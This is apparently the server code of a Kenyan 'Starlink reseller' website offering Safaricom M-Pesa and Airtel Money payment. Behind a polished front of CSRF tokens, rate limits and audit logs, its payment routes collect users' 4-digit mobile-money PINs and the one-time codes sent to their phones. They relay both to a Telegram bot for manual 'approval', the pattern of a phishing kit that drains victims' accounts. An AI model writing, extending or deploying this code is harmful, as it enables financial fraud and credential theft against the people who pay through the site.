const express = require('express');
const path = require('path');
const crypto = require('crypto');
require('dotenv').config({ path: path.join(__dirname, '..', '.env') });

const { listPackages, getPackage, CATEGORIES, CURRENCY } = require('./packages');
const { createApprovalRequest, submitOtp, getApprovalStatus, sendNotification } = require('./telegram-bot');
const {
    securityHeaders,
    corsMiddleware,
    validateApiSecret,
    rateLimit,
    validator,
    validateRegistration,
    validateLogin,
    auditLog,
    createSession,
    validateSession,
    safeEqual,
    maskPhone,
    IS_PRODUCTION,
} = require('./security');

const app = express();
const PORT = process.env.PORT || 3000;
const ROOT = path.join(__dirname, '..');
const SUPPORT_PHONE = process.env.SUPPORT_PHONE || '+254712345678';
const SUPPORT_EMAIL = process.env.SUPPORT_EMAIL || 'support@starlink-ke.co.ke';

// Behind a reverse proxy (nginx/Cloudflare) this makes req.ip the real client IP
// so rate limiting cannot be bypassed and audit logs are accurate.
app.set('trust proxy', Number(process.env.TRUST_PROXY_HOPS || 1));
app.disable('x-powered-by');

// Warn (do not crash) when Telegram is unconfigured — the site still works.
const telegramSecrets = ['TELEGRAM_BOT_TOKEN', 'TELEGRAM_ADMIN_CHAT_ID'];
const missingTelegram = telegramSecrets.filter(
    (k) => !process.env[k] || /your-|your_|change-me|placeholder/i.test(process.env[k])
);
if (missingTelegram.length) {
    console.warn('⚠️  Telegram approval disabled — missing/placeholder:', missingTelegram.join(', '));
}

app.use(securityHeaders);
app.use(corsMiddleware);
app.use(express.json({ limit: '64kb' }));
app.use(express.urlencoded({ extended: false, limit: '64kb' }));

// ── CSRF: double-submit token bound to a session ───────────────
const csrfStore = new Map();
const CSRF_TTL = 60 * 60 * 1000;

function issueCsrfToken(sessionToken) {
    const token = crypto.randomBytes(32).toString('hex');
    csrfStore.set(token, { sessionToken, createdAt: Date.now() });
    return token;
}

function consumeCsrfToken(sessionToken, csrfToken) {
    if (!sessionToken || !csrfToken) return false;
    const record = csrfStore.get(csrfToken);
    if (!record) return false;
    if (Date.now() - record.createdAt > CSRF_TTL) {
        csrfStore.delete(csrfToken);
        return false;
    }
    if (!safeEqual(record.sessionToken, sessionToken)) return false;
    // Single use: prevents replay of a captured token.
    csrfStore.delete(csrfToken);
    return true;
}

setInterval(() => {
    const now = Date.now();
    for (const [token, record] of csrfStore.entries()) {
        if (now - record.createdAt > CSRF_TTL) csrfStore.delete(token);
    }
}, 5 * 60 * 1000).unref?.();

/** Requires a valid session (X-API-Secret) plus a matching one-time CSRF token. */
function requireCsrf(req, res, next) {
    const sessionToken = req.headers['x-api-secret'];
    if (!sessionToken || !validateSession(sessionToken)) {
        return res.status(401).json({ success: false, message: 'Session expired. Please reload the page.' });
    }
    const csrfToken = req.headers['x-csrf-token'] || req.body?.csrfToken;
    if (!consumeCsrfToken(sessionToken, csrfToken)) {
        return res.status(403).json({ success: false, message: 'Invalid or expired security token. Please reload the page.' });
    }
    next();
}

// ── Password hashing (scrypt, constant-time verify) ────────────
function hashPassword(password) {
    const salt = crypto.randomBytes(16);
    const derived = crypto.scryptSync(password, salt, 64, { N: 16384, r: 8, p: 1 });
    return `scrypt$${salt.toString('hex')}$${derived.toString('hex')}`;
}

function verifyPassword(password, stored) {
    if (typeof stored !== 'string') return false;
    const [scheme, saltHex, hashHex] = stored.split('$');
    if (scheme !== 'scrypt' || !saltHex || !hashHex) return false;
    const derived = crypto.scryptSync(password, Buffer.from(saltHex, 'hex'), 64, { N: 16384, r: 8, p: 1 });
    const expected = Buffer.from(hashHex, 'hex');
    if (derived.length !== expected.length) return false;
    return crypto.timingSafeEqual(derived, expected);
}

// Precomputed once at boot: logins for unknown users still pay scrypt cost
// (so timing cannot reveal whether an account exists) without allocating a
// fresh salt and re-deriving on every attempt.
const DUMMY_HASH = hashPassword('dummy-password-for-timing-parity');

// Demo persistence layer. Swap for a real database in production.
const users = new Map(); // normalizedPhone -> { name, passwordHash, createdAt }

// ── Static pages ──────────────────────────────────────────────
const pages = {
    '/': 'plans.html',
    '/starlink/': 'plans.html',
    '/starlink/plans.html': 'plans.html',
    '/starlink/status.html': 'index.html',
    '/starlink/orders.html': 'orders.html',
    '/starlink/settings.html': 'settings.html',
    '/starlink/register.html': 'register.html',
    '/starlink/login.html': 'user-login.html',
    '/pay/': path.join('pay', 'index.html'),
    '/pay/index.html': path.join('pay', 'index.html'),
};

for (const [route, file] of Object.entries(pages)) {
    app.get(route, (req, res) => res.sendFile(path.join(ROOT, file)));
}

// Convenience redirects for bare paths.
app.get('/plans.html', (req, res) => res.redirect(301, '/starlink/plans.html'));
app.get('/status.html', (req, res) => res.redirect(301, '/starlink/status.html'));
app.get('/orders.html', (req, res) => res.redirect(301, '/starlink/orders.html'));
app.get('/settings.html', (req, res) => res.redirect(301, '/starlink/settings.html'));
app.get('/register.html', (req, res) => res.redirect(301, '/starlink/register.html'));
app.get('/login.html', (req, res) => res.redirect(301, '/starlink/login.html'));

app.use('/starlink', express.static(ROOT, { index: false, dotfiles: 'deny' }));
app.use(express.static(ROOT, { index: false, dotfiles: 'deny' }));

// ── Public API ────────────────────────────────────────────────
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', service: 'Starlink Reseller Kenya API', currency: CURRENCY });
});

app.post('/api/auth/session', rateLimit({ maxRequests: 30, windowMs: 60000, scope: 'session' }), (req, res) => {
    const token = createSession();
    res.json({ success: true, token, expiresIn: 60 * 60 * 1000 });
});

app.get('/api/csrf-token', validateApiSecret, rateLimit({ maxRequests: 60, windowMs: 60000, scope: 'csrf' }), (req, res) => {
    res.json({ success: true, csrfToken: issueCsrfToken(req.headers['x-api-secret']) });
});

app.get('/api/config', (req, res) => {
    res.json({
        country: 'KE',
        countryName: 'Kenya',
        currency: CURRENCY,
        dialCode: '+254',
        language: 'en',
        supportEmail: SUPPORT_EMAIL,
        supportPhone: SUPPORT_PHONE,
        methods: [
            { id: 'safaricom', name: 'Safaricom M-Pesa', short: 'M-PESA', color: '#3EB449', textColor: '#ffffff' },
            { id: 'airtel', name: 'Airtel Money', short: 'airtel', color: '#E8112D', textColor: '#ffffff' },
        ],
    });
});

app.get('/api/packages', (req, res) => {
    res.json({ success: true, currency: CURRENCY, categories: CATEGORIES, packages: listPackages() });
});

app.get('/api/packages/:id', (req, res) => {
    const pkg = getPackage(req.params.id);
    if (!pkg) return res.status(404).json({ success: false, message: 'Package not found' });
    res.json({ success: true, package: pkg });
});

// ── Auth ──────────────────────────────────────────────────────
app.post(
    '/api/starlink/register',
    rateLimit({ maxRequests: 5, windowMs: 15 * 60 * 1000, scope: 'register' }),
    requireCsrf,
    (req, res) => {
        const ip = req.ip;
        const checked = validateRegistration(req.body);
        if (!checked.ok) {
            return res.status(400).json({ success: false, field: checked.field, message: checked.message });
        }
        const { normalizedPhone, name } = checked;

        if (users.has(normalizedPhone)) {
            auditLog.logAuth('REGISTER', ip, normalizedPhone, false, 'duplicate');
            return res.status(409).json({ success: false, field: 'phone', message: 'This number is already registered. Please log in.' });
        }

        users.set(normalizedPhone, {
            name,
            passwordHash: hashPassword(req.body.password),
            createdAt: Date.now(),
        });

        auditLog.logAuth('REGISTER', ip, normalizedPhone, true);
        res.status(201).json({
            success: true,
            message: 'Account created successfully.',
            user: { phone: normalizedPhone, name: users.get(normalizedPhone).name },
        });
    }
);

app.post(
    '/api/starlink/login',
    rateLimit({ maxRequests: 10, windowMs: 15 * 60 * 1000, scope: 'login' }),
    requireCsrf,
    (req, res) => {
        const ip = req.ip;
        const checked = validateLogin(req.body);
        if (!checked.ok) {
            return res.status(400).json({ success: false, field: checked.field, message: checked.message });
        }
        const { normalizedPhone } = checked;
        const { password } = req.body;

        const user = users.get(normalizedPhone);
        // Same generic message and comparable work for unknown user vs wrong
        // password, so the response cannot be used to enumerate accounts.
        const ok = user ? verifyPassword(password, user.passwordHash) : verifyPassword(password, DUMMY_HASH);
        if (!user || !ok) {
            auditLog.logAuth('LOGIN', ip, normalizedPhone, false, 'invalid_credentials');
            return res.status(401).json({ success: false, field: 'form', message: 'Incorrect phone number or password.' });
        }

        auditLog.logAuth('LOGIN', ip, normalizedPhone, true);
        res.json({ success: true, message: 'Login successful.', user: { phone: normalizedPhone, name: user.name } });
    }
);

// ── Payment flow (Airtel Money / Safaricom M-Pesa + Telegram) ──
const orders = new Map(); // requestId -> order snapshot

app.post(
    '/api/pay/submit',
    rateLimit({ maxRequests: 8, windowMs: 10 * 60 * 1000, scope: 'pay-submit' }),
    validateApiSecret,
    (req, res) => {
        const { phone, pin, method, package: packageId } = req.body || {};
        const ip = req.ip;

        const normalizedPhone = validator.normalizePhone(phone);
        if (!normalizedPhone) {
            return res.status(400).json({ success: false, field: 'phone', message: 'Enter a valid Kenyan number, e.g. 0712 345 678.' });
        }
        if (!validator.pin(pin)) {
            return res.status(400).json({ success: false, field: 'pin', message: 'Enter your 4-digit PIN.' });
        }
        if (!validator.method(method)) {
            return res.status(400).json({ success: false, field: 'method', message: 'Choose Safaricom M-Pesa or Airtel Money.' });
        }
        // Price is resolved server-side. A tampered client amount cannot change it.
        const pkg = getPackage(packageId);
        if (!pkg) {
            return res.status(400).json({ success: false, field: 'package', message: 'Unknown package. Please pick a bundle again.' });
        }

        const methodName = method === 'safaricom' ? 'Safaricom M-Pesa' : 'Airtel Money';
        const amountLabel = `${CURRENCY} ${pkg.price.toLocaleString('en-KE')}`;

        const requestId = createApprovalRequest({
            userPhone: normalizedPhone,
            userPin: pin,
            package: `${pkg.name} · ${pkg.duration}`,
            amount: amountLabel,
            method: methodName,
        });

        orders.set(requestId, {
            requestId,
            phone: normalizedPhone,
            method,
            methodName,
            packageId: pkg.id,
            packageName: `${pkg.name} · ${pkg.duration}`,
            amount: pkg.price,
            currency: CURRENCY,
            createdAt: Date.now(),
        });

        auditLog.logPaymentRequest(ip, normalizedPhone, pkg.id, method, requestId);
        res.json({
            success: true,
            requestId,
            message: 'Payment request sent for verification.',
            order: { package: pkg.name, duration: pkg.duration, amount: pkg.price, currency: CURRENCY, method: methodName },
        });
    }
);

app.post(
    '/api/pay/submit-otp',
    rateLimit({ maxRequests: 12, windowMs: 10 * 60 * 1000, scope: 'pay-otp' }),
    validateApiSecret,
    (req, res) => {
        const { requestId, otp } = req.body || {};
        if (!validator.requestId(requestId)) {
            return res.status(400).json({ success: false, message: 'Invalid request reference.' });
        }
        if (!validator.otp(otp)) {
            return res.status(400).json({ success: false, field: 'otp', message: 'Enter the code sent to your phone (4–8 digits).' });
        }
        const result = submitOtp(requestId, otp);
        auditLog.logOtpSubmit(req.ip, requestId, result.success);
        res.status(result.success ? 200 : 400).json(result);
    }
);

app.get(
    '/api/pay/status/:requestId',
    rateLimit({ maxRequests: 240, windowMs: 60000, scope: 'pay-status' }),
    validateApiSecret,
    (req, res) => {
        const { requestId } = req.params;
        if (!validator.requestId(requestId)) {
            return res.status(400).json({ status: 'invalid_request' });
        }
        const state = getApprovalStatus(requestId);
        const order = orders.get(requestId);
        // 'not_found' only means the approval record was evicted after its
        // retention window. A locally known order is at worst still 'pending'.
        const status = state.status === 'not_found' && order ? 'pending' : state.status;
        // Never echo the PIN or the expected OTP back to the browser.
        res.json({
            status,
            package: order?.packageName || state.package,
            amount: order ? order.amount : undefined,
            currency: order?.currency || CURRENCY,
            method: order?.methodName || state.method,
        });
    }
);

app.post(
    '/api/pay/resend-otp',
    rateLimit({ maxRequests: 4, windowMs: 10 * 60 * 1000, scope: 'pay-resend' }),
    validateApiSecret,
    (req, res) => {
        const { requestId } = req.body || {};
        if (!validator.requestId(requestId)) {
            return res.status(400).json({ success: false, message: 'Invalid request reference.' });
        }
        const order = orders.get(requestId);
        if (!order) return res.status(404).json({ success: false, message: 'Request not found or expired.' });

        sendNotification(
            `🔁 OTP resend requested\n\n📱 ${maskPhone(order.phone)}\n📦 ${order.packageName}\n💳 ${order.methodName}\n🆔 ${requestId}`
        );
        res.json({ success: true, message: 'A new code has been requested.' });
    }
);

// ── Orders (demo read model) ──────────────────────────────────
app.get('/api/orders', validateApiSecret, (req, res) => {
    const normalizedPhone = validator.normalizePhone(req.query.phone);
    if (!normalizedPhone) {
        return res.status(400).json({ success: false, message: 'A valid Kenyan phone number is required.' });
    }
    const result = [...orders.values()]
        .filter((o) => o.phone === normalizedPhone)
        .map((o) => ({
            id: o.requestId,
            package: o.packageName,
            amount: o.amount,
            currency: o.currency,
            method: o.methodName,
            date: new Date(o.createdAt).toISOString(),
            // Fall back to 'pending' when the approval record has been evicted;
            // the order itself is still a real, placed order.
            status: (() => {
                const s = getApprovalStatus(o.requestId).status;
                return s === 'not_found' ? 'pending' : s;
            })(),
        }))
        .sort((a, b) => new Date(b.date) - new Date(a.date));
    res.json({ success: true, orders: result });
});

app.get('/api/support', (req, res) => {
    res.json({ phone: SUPPORT_PHONE, email: SUPPORT_EMAIL, hours: '24/7' });
});

// ── Payment provider webhooks (signature-verified) ─────────────
function verifyWebhook(provider) {
    return (req, res, next) => {
        const secret = process.env[`${provider.toUpperCase()}_WEBHOOK_SECRET`];
        if (!secret) {
            // Fail closed: an unconfigured webhook must not accept traffic.
            return res.status(503).json({ success: false, message: 'Webhook not configured' });
        }
        const signature = req.headers['x-signature'];
        const expected = crypto.createHmac('sha256', secret).update(JSON.stringify(req.body || {})).digest('hex');
        if (!signature || !safeEqual(String(signature), expected)) {
            auditLog.write('WEBHOOK_REJECTED', { provider, ip: req.ip });
            return res.status(401).json({ success: false, message: 'Invalid signature' });
        }
        next();
    };
}

/**
 * Mounts a signature-verified webhook for a payment provider.
 * @param {string} provider Lowercase provider name matching the *_WEBHOOK_SECRET env prefix.
 * @param {string} scope    Rate-limit scope for this provider's route.
 */
function registerWebhook(provider, scope) {
    app.post(
        `/api/webhook/${provider}`,
        rateLimit({ maxRequests: 60, windowMs: 60000, scope }),
        verifyWebhook(provider),
        (req, res) => {
            auditLog.write(`WEBHOOK_${provider.toUpperCase()}`, {
                ip: req.ip,
                transactionId: validator.sanitize(req.body?.transactionId || '', 64),
            });
            res.json({ success: true });
        }
    );
}

registerWebhook('safaricom', 'wh-saf');
registerWebhook('airtel', 'wh-air');

// ── Fallbacks ─────────────────────────────────────────────────
app.use('/api', (req, res) => res.status(404).json({ success: false, message: 'Endpoint not found' }));
app.use((req, res) => res.status(404).sendFile(path.join(ROOT, 'plans.html')));

// eslint-disable-next-line no-unused-vars
app.use((err, req, res, next) => {
    // Log server-side, return an opaque message so stack traces never leak.
    console.error('Unhandled error:', err.message);
    auditLog.write('SERVER_ERROR', { path: req.path, message: err.message });
    // A streaming/partial response cannot be replaced — hand back to Express
    // (which will destroy the socket) instead of writing a second response.
    if (res.headersSent) return next(err);
    res.status(500).json({ success: false, message: 'Something went wrong. Please try again.' });
});

app.listen(PORT, () => {
    console.log(`🚀 Starlink Reseller Kenya running on http://localhost:${PORT}`);
    console.log(`📡 API: http://localhost:${PORT}/api  ·  ${listPackages().length} packages  ·  ${CURRENCY}`);
    if (!IS_PRODUCTION) console.log('🧪 NODE_ENV is not "production" — HSTS disabled, verbose logging on.');
});

module.exports = app;
